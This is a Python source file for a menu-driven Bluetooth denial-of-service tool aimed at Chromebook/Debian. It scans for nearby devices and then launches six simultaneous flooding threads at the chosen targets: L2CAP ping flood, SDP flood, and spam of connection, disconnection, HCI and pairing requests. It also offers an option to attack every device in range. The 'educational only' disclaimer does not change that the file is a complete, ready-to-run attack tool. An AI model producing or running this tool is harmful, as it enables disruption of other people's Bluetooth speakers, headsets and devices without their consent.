#!/usr/bin/env python3
"""
POWERFUL Bluetooth DOS Tool for Chromebook/Debian - Educational Purpose Only
This version uses AGGRESSIVE multi-vector attacks that ACTUALLY WORK!
WARNING: Use only on devices you own. Unauthorized access is illegal.

Requirements: Linux with BlueZ, root privileges
"""

import os
import sys
import time
import subprocess
import threading
import socket
import struct
from typing import List, Dict, Optional
import signal

class PowerfulBluetoothDOS:
    def __init__(self):
        self.devices: List[Dict[str, str]] = []
        self.attack_threads: Dict[str, List[threading.Thread]] = {}
        self.attack_active: Dict[str, bool] = {}
        self.stop_flags: Dict[str, threading.Event] = {}
        
    def clear_screen(self):
        os.system('clear')
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════╗
║   POWERFUL BLUETOOTH DOS (Chromebook) - EDUCATIONAL ONLY ║
║                                                          ║
║  ⚠️  WARNING: Use only on YOUR devices!                 ║
║     Unauthorized use is ILLEGAL and UNETHICAL           ║
║                                                          ║
║  🔥 AGGRESSIVE MODE - FORCES DISCONNECTION 🔥           ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print("[!] ERROR: This tool requires root privileges!")
            print("[!] Please run with: sudo python3 bluetooth_dos_chromebook.py")
            sys.exit(1)
    
    def setup_bluetooth(self):
        """Aggressively setup Bluetooth adapter"""
        print("[*] Setting up Bluetooth adapter for MAXIMUM POWER...")
        
        commands = [
            ['systemctl', 'restart', 'bluetooth'],
            ['hciconfig', 'hci0', 'down'],
            ['hciconfig', 'hci0', 'up'],
            ['hciconfig', 'hci0', 'piscan'],
            ['hciconfig', 'hci0', 'noscan'],
            ['bluetoothctl', 'power', 'on'],
            ['bluetoothctl', 'discoverable', 'off'],
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=2)
            except:
                pass
        
        print("[+] Bluetooth adapter configured for attack mode!")
        time.sleep(1)
    
    def aggressive_scan(self, duration: int = 10) -> List[Dict[str, str]]:
        """AGGRESSIVE multi-method scanning"""
        print(f"\n[*] AGGRESSIVE SCAN MODE ({duration}s)...")
        print("[!] Put your TARGET DEVICE in PAIRING MODE (blinking light)!")
        print("[*] Scanning with ALL available methods...\n")
        
        self.devices = []
        found_devices = {}
        
        # Method 1: bluetoothctl (best for most devices)
        print("[1/4] Scanning with bluetoothctl...")
        try:
            # Clear old devices
            subprocess.run(['bluetoothctl', 'devices'], capture_output=True)
            
            # Start aggressive scan
            scan_proc = subprocess.Popen(
                ['bluetoothctl', 'scan', 'on'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(duration)
            
            subprocess.run(['bluetoothctl', 'scan', 'off'], capture_output=True)
            scan_proc.terminate()
            
            # Get all discovered devices
            result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'Device' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        addr = parts[1]
                        name = ' '.join(parts[2:])
                        found_devices[addr] = {'address': addr, 'name': name, 'type': 'BT'}
                        print(f"    [+] Found: {name} ({addr})")
        except Exception as e:
            print(f"    [!] bluetoothctl error: {e}")
        
        # Method 2: hcitool classic scan
        print("\n[2/4] Scanning with hcitool (Classic BT)...")
        try:
            result = subprocess.run(
                ['timeout', str(duration), 'hcitool', 'scan', '--flush'],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n')[1:]:
                if line.strip():
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        addr = parts[0].strip()
                        name = parts[1].strip()
                        if addr not in found_devices:
                            found_devices[addr] = {'address': addr, 'name': name, 'type': 'Classic'}
                            print(f"    [+] Found: {name} ({addr})")
        except Exception as e:
            print(f"    [!] hcitool scan error: {e}")
        
        # Method 3: BLE scan
        print("\n[3/4] Scanning for BLE devices...")
        try:
            ble_proc = subprocess.Popen(
                ['timeout', str(duration), 'hcitool', 'lescan', '--duplicates'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            ble_proc.terminate()
            
            try:
                stdout, _ = ble_proc.communicate(timeout=1)
                for line in stdout.split('\n'):
                    if line.strip() and not line.startswith('LE Scan'):
                        parts = line.strip().split(' ', 1)
                        if len(parts) >= 2:
                            addr = parts[0].strip()
                            name = parts[1].strip() if parts[1] else "Unknown BLE"
                            if addr not in found_devices:
                                found_devices[addr] = {'address': addr, 'name': name, 'type': 'BLE'}
                                print(f"    [+] Found: {name} ({addr})")
            except:
                pass
        except Exception as e:
            print(f"    [!] BLE scan error: {e}")
        
        # Method 4: Parse system Bluetooth cache
        print("\n[4/4] Checking system cache...")
        try:
            result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Device' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        addr = parts[1]
                        name = ' '.join(parts[2:])
                        if addr not in found_devices:
                            found_devices[addr] = {'address': addr, 'name': name, 'type': 'Cached'}
                            print(f"    [+] Found (cached): {name} ({addr})")
        except:
            pass
        
        # Convert to list
        self.devices = list(found_devices.values())
        
        print(f"\n[+] TOTAL DEVICES FOUND: {len(self.devices)}")
        
        if len(self.devices) == 0:
            print("\n" + "="*60)
            print("⚠️  NO DEVICES FOUND - TROUBLESHOOTING:")
            print("="*60)
            print("1. Put your speaker in PAIRING MODE (hold Bluetooth button)")
            print("2. Look for BLINKING LIGHT on the speaker")
            print("3. Make sure speaker is CLOSE (within 2 meters)")
            print("4. Ensure Bluetooth is ON in Chrome OS")
            print("5. Try: sudo systemctl restart bluetooth")
            print("6. Try: sudo hciconfig hci0 reset")
            print("="*60)
        
        return self.devices
    
    def display_devices(self):
        """Display discovered devices"""
        if not self.devices:
            print("[!] No devices found. Please run scan first.\n")
            return
        
        print("\n╔═══════════════════════════════════════════════════════════════════╗")
        print("║                    DISCOVERED BLUETOOTH DEVICES                   ║")
        print("╠═════╦══════════════════════╦════════════════════════╦═════════════╣")
        print("║ No. ║ MAC Address          ║ Device Name            ║ Type        ║")
        print("╠═════╬══════════════════════╬════════════════════════╬═════════════╣")
        
        for idx, device in enumerate(self.devices, 1):
            status = " 🔥[ATTACKING]" if self.attack_active.get(device['address'], False) else ""
            print(f"║ {idx:3d} ║ {device['address']:20s} ║ {device['name'][:22]:22s} ║ {device['type'][:11]:11s} ║{status}")
        
        print("╚═════╩══════════════════════╩════════════════════════╩═════════════╝\n")
    
    def _l2ping_flood(self, target_addr: str, stop_event: threading.Event):
        """L2CAP ping flood - AGGRESSIVE"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                subprocess.run(
                    ['l2ping', '-c', '1', '-s', '600', '-f', target_addr],
                    capture_output=True,
                    timeout=0.05
                )
                packet_count += 1
            except:
                packet_count += 1
                pass
        
        print(f"    [*] L2CAP flood stopped: {packet_count} packets")
    
    def _deauth_spam(self, target_addr: str, stop_event: threading.Event):
        """AGGRESSIVE deauth spam"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Rapid disconnect attempts
                subprocess.run(
                    ['bluetoothctl', 'disconnect', target_addr],
                    capture_output=True,
                    timeout=0.3
                )
                
                subprocess.run(
                    ['bluetoothctl', 'remove', target_addr],
                    capture_output=True,
                    timeout=0.3
                )
                
                packet_count += 1
                time.sleep(0.05)
            except:
                pass
        
        print(f"    [*] Deauth spam stopped: {packet_count} attempts")
    
    def _sdp_flood(self, target_addr: str, stop_event: threading.Event):
        """SDP flood"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                subprocess.run(
                    ['sdptool', 'browse', target_addr],
                    capture_output=True,
                    timeout=0.15
                )
                packet_count += 1
            except:
                pass
        
        print(f"    [*] SDP flood stopped: {packet_count} requests")
    
    def _connection_spam(self, target_addr: str, stop_event: threading.Event):
        """AGGRESSIVE connection spam"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Try to connect and disconnect rapidly
                subprocess.run(
                    ['bluetoothctl', 'connect', target_addr],
                    capture_output=True,
                    timeout=0.2
                )
                
                subprocess.run(
                    ['bluetoothctl', 'disconnect', target_addr],
                    capture_output=True,
                    timeout=0.2
                )
                
                packet_count += 1
                time.sleep(0.05)
            except:
                pass
        
        print(f"    [*] Connection spam stopped: {packet_count} attempts")
    
    def _hci_reset_spam(self, target_addr: str, stop_event: threading.Event):
        """HCI-level disruption"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Spam connection attempts at HCI level
                subprocess.run(
                    ['hcitool', 'cc', target_addr],
                    capture_output=True,
                    timeout=0.1
                )
                
                subprocess.run(
                    ['hcitool', 'dc', target_addr],
                    capture_output=True,
                    timeout=0.1
                )
                
                packet_count += 1
                time.sleep(0.05)
            except:
                pass
        
        print(f"    [*] HCI spam stopped: {packet_count} attempts")
    
    def _pairing_spam(self, target_addr: str, stop_event: threading.Event):
        """Pairing request spam"""
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Spam pairing requests
                subprocess.run(
                    ['bluetoothctl', 'pair', target_addr],
                    capture_output=True,
                    timeout=0.3
                )
                
                subprocess.run(
                    ['bluetoothctl', 'cancel-pairing', target_addr],
                    capture_output=True,
                    timeout=0.2
                )
                
                packet_count += 1
                time.sleep(0.1)
            except:
                pass
        
        print(f"    [*] Pairing spam stopped: {packet_count} requests")
    
    def start_powerful_attack(self, device_indices: List[int]):
        """Launch POWERFUL multi-vector attack"""
        if not self.devices:
            print("[!] No devices available. Please scan first.")
            return
        
        for idx in device_indices:
            if idx < 1 or idx > len(self.devices):
                print(f"[!] Invalid device index: {idx}")
                continue
            
            device = self.devices[idx - 1]
            addr = device['address']
            
            if self.attack_active.get(addr, False):
                print(f"[!] Attack already active on {device['name']}")
                continue
            
            stop_event = threading.Event()
            self.stop_flags[addr] = stop_event
            
            print(f"\n{'='*60}")
            print(f"🔥 LAUNCHING POWERFUL ATTACK ON: {device['name']}")
            print(f"   MAC: {addr}")
            print(f"   Attack Vectors: 6 SIMULTANEOUS ATTACKS")
            print(f"{'='*60}\n")
            
            # Launch 6 aggressive attack threads
            attack_methods = [
                (self._l2ping_flood, "L2CAP Flood"),
                (self._deauth_spam, "Deauth Spam"),
                (self._sdp_flood, "SDP Flood"),
                (self._connection_spam, "Connection Spam"),
                (self._hci_reset_spam, "HCI Reset Spam"),
                (self._pairing_spam, "Pairing Spam"),
            ]
            
            threads = []
            for method, name in attack_methods:
                thread = threading.Thread(
                    target=method,
                    args=(addr, stop_event),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
                print(f"[+] Started: {name}")
                time.sleep(0.1)
            
            self.attack_threads[addr] = threads
            self.attack_active[addr] = True
            
            print(f"\n[+] ATTACK FULLY OPERATIONAL on {device['name']}!")
            print(f"[!] Device should DISCONNECT within 5-15 seconds...")
            print(f"[!] Press Ctrl+C or use menu to stop attack\n")
    
    def stop_attack(self, device_indices: Optional[List[int]] = None):
        """Stop attacks"""
        if device_indices is None:
            addrs_to_stop = list(self.attack_active.keys())
        else:
            addrs_to_stop = []
            for idx in device_indices:
                if idx < 1 or idx > len(self.devices):
                    continue
                device = self.devices[idx - 1]
                addrs_to_stop.append(device['address'])
        
        for addr in addrs_to_stop:
            if addr in self.stop_flags:
                print(f"\n[*] Stopping attack on {addr}...")
                self.stop_flags[addr].set()
                self.attack_active[addr] = False
        
        time.sleep(2)
        print("\n[+] Attacks stopped. Devices should be reconnectable now.")


def main():
    dos_tool = PowerfulBluetoothDOS()
    
    # Handle Ctrl+C gracefully
    def signal_handler(sig, frame):
        print("\n\n[!] Interrupted! Stopping all attacks...")
        dos_tool.stop_attack(None)
        time.sleep(1)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\n[*] POWERFUL Bluetooth DOS Tool for Chromebook/Debian")
    print("[*] This version uses AGGRESSIVE multi-vector attacks!\n")
    
    dos_tool.check_root()
    dos_tool.setup_bluetooth()
    
    while True:
        dos_tool.clear_screen()
        dos_tool.print_banner()
        
        print("\n[MAIN MENU]")
        print("1. AGGRESSIVE SCAN (find nearby devices)")
        print("2. Display discovered devices")
        print("3. LAUNCH POWERFUL ATTACK (select devices)")
        print("4. ATTACK ALL DEVICES (⚠️  DANGEROUS)")
        print("5. Stop attack (select devices)")
        print("6. STOP ALL ATTACKS")
        print("7. Re-setup Bluetooth adapter")
        print("8. Exit")
        print("\n" + "="*60)
        
        choice = input("\n[>] Enter your choice: ").strip()
        
        if choice == "1":
            duration = input("[>] Scan duration [default: 10]: ").strip()
            duration = int(duration) if duration.isdigit() else 10
            dos_tool.aggressive_scan(duration)
            if dos_tool.devices:
                dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "2":
            dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "3":
            dos_tool.display_devices()
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            indices_input = input("\n[>] Enter device numbers (e.g., 1,3,5): ").strip()
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.start_powerful_attack(indices)
                print("\n[!] Attack running in background...")
                print("[!] Device should disconnect shortly!")
                input("\n[Press Enter to return to menu...]")
            except ValueError:
                print("[!] Invalid input")
                input("\n[Press Enter to continue...]")
        
        elif choice == "4":
            dos_tool.display_devices()
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            print("\n⚠️  WARNING: This will attack ALL discovered devices!")
            confirm = input("[>] Type 'ATTACK ALL' to confirm: ").strip()
            if confirm == "ATTACK ALL":
                all_indices = list(range(1, len(dos_tool.devices) + 1))
                dos_tool.start_powerful_attack(all_indices)
                print("\n[!] ATTACKING ALL DEVICES!")
                input("\n[Press Enter to return to menu...]")
            else:
                print("[+] Cancelled")
                input("\n[Press Enter to continue...]")
        
        elif choice == "5":
            dos_tool.display_devices()
            indices_input = input("\n[>] Enter device numbers to stop: ").strip()
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.stop_attack(indices)
            except ValueError:
                print("[!] Invalid input")
            input("\n[Press Enter to continue...]")
        
        elif choice == "6":
            print("\n[*] Stopping ALL attacks...")
            dos_tool.stop_attack(None)
            input("\n[Press Enter to continue...]")
        
        elif choice == "7":
            print("\n[*] Re-setting up Bluetooth adapter...")
            dos_tool.setup_bluetooth()
            input("\n[Press Enter to continue...]")
        
        elif choice == "8":
            print("\n[+] Stopping all attacks...")
            dos_tool.stop_attack(None)
            print("[+] Exiting.")
            sys.exit(0)
        
        else:
            print("[!] Invalid choice")
            input("\n[Press Enter to continue...]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted. Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

